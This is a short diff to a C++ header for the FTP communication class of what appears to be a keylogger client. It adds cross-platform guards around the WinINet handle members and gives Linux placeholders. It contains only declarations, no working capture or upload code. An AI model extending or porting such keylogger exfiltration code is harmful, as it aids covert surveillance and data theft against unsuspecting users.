@@ -1,10 +1,11 @@
 // KeyLoggerClient/include/communication/FtpComms.h
 #ifndef FTPCOMMS_H
-#define FTPCOMMS_H
+#define FTPCOMMS_H  
 
 #include "communication/BaseComms.h"
-#include <windows.h>    
-#include <wininet.h>
+#include "core/Platform.h"
+#include <vector>
+#include <cstdint>
 
 class Configuration;
 
@@ -21,8 +22,14 @@ public:
     
 private:
     Configuration* m_config;
+    
+    #if PLATFORM_WINDOWS
     HINTERNET m_hInternet;
     HINTERNET m_hConnect;
+    #else
+    void* m_hInternet; // Placeholder for Linux
+    void* m_hConnect;  // Placeholder for Linux
+    #endif
 };
 
 #endif
